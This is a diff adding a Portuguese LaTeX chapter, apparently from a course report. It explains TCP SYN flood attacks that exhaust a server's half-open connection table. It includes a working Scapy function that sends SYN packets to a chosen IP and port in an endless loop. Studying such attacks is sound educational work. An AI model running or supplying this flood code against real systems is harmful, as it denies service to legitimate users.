@@ -1,0 +1,32 @@
+\chapter{Ataque de Exaustão TCP: 3-SynFlood.py}
+\label{cap4}
+
+\section{Fundamentação Teórica: Exaustão da Tabela de Estados}
+O SYN Flood é um ataque de camada de transporte mais sofisticado. Ele explora a "fila de conexões pendentes" (\textit{backlog queue}) do sistema operativo. Ao enviar múltiplos pacotes SYN e nunca responder ao SYN-ACK do servidor, o atacante deixa as conexões num estado \textit{half-open}. O servidor reserva memória para cada uma destas conexões falsas até que a tabela esgote, impedindo utilizadores legítimos de aceder ao serviço.
+
+\section{Estratégia de Baixo Nível}
+Para esta funcionalidade, o uso de sockets padrão de Python é insuficiente, pois o SO gere o handshake automaticamente. Por isso, no ficheiro \texttt{3-SynFlood.py}, utilizou-se a biblioteca \textbf{Scapy}. O Scapy permite a manipulação direta dos cabeçalhos IP e TCP.
+
+\section{Análise Detalhada do Código}
+
+A construção do pacote é feita camada a camada:
+
+\begin{lstlisting}[caption={Manipulação de Flags TCP com Scapy}]
+from scapy.all import IP, TCP, send
+
+def syn_flood(dst_ip, dst_port):
+    # Camada 3: Definimos o IP de destino.
+    ip_layer = IP(dst=dst_ip)
+    
+    # Camada 4: Definimos o porto e a flag 'S' (SYN).
+    # O porto de origem (sport) pode ser aleatório para cada pacote.
+    tcp_layer = TCP(sport=1234, dport=dst_port, flags="S")
+    
+    # Montagem do pacote (Encapsulamento).
+    packet = ip_layer / tcp_layer
+    
+    # Envio contínuo (loop=1) sem esperar por respostas (verbose=0).
+    send(packet, loop=1, verbose=0)
+\end{lstlisting}
+
+Esta técnica cumpre o requisito 1.3 do enunciado, demonstrando conhecimento avançado sobre protocolos de rede e manipulação de pacotes binários.
